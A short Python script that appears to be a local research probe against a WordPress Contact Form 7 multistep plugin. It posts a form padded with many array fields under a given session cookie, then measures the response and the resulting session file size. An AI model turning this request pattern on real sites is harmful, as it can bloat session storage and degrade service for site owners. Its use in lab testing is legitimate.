#!/usr/bin/env python3
import http.client,sys,urllib.parse,os,time
PORT=28893
sid=sys.argv[1]; groups=int(sys.argv[2]); per=int(sys.argv[3]); out=sys.argv[4]
base='http://127.0.0.1:28893'
fields=[('_wpcf7','26'),('_wpcf7_version','6.2.3'),('_wpcf7_locale','en_US'),('_wpcf7_unit_tag','wpcf7-f26-p24-o1'),('_wpcf7_container_post','24'),('_wpcf7_posted_data_hash','')]
for g in range(groups):
    name='f%03d[]'%g
    for j in range(per): fields.append((name,'v%03d_%02d'%(g,j)))
fields += [('_cf7msm_multistep_tag','{"first_step":1,"next_url":"'+base+'/plugin-step2/"}'),('cf7msm-no-ss','')]
body=urllib.parse.urlencode(fields).encode()
h={'Content-Type':'application/x-www-form-urlencoded','Content-Length':str(len(body)),'Cookie':'PHPSESSID='+sid,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36','Referer':base+'/plugin-step1/'}
c=http.client.HTTPConnection('127.0.0.1',PORT,timeout=180); t=time.time(); c.request('POST','/plugin-step1/',body,h); r=c.getresponse(); data=r.read(); c.close()
open(out,'wb').write(data)
print('status',r.status,'req',len(body),'resp',len(data),'time',round(time.time()-t,3),'headers',dict(r.getheaders()))
p='/tmp/opencode/research/realchain_20261022T015900Z/www/wp-content/uploads/sessions/sess_'+sid
try: print('sess_size',os.path.getsize(p))
except FileNotFoundError: print('sess_missing')
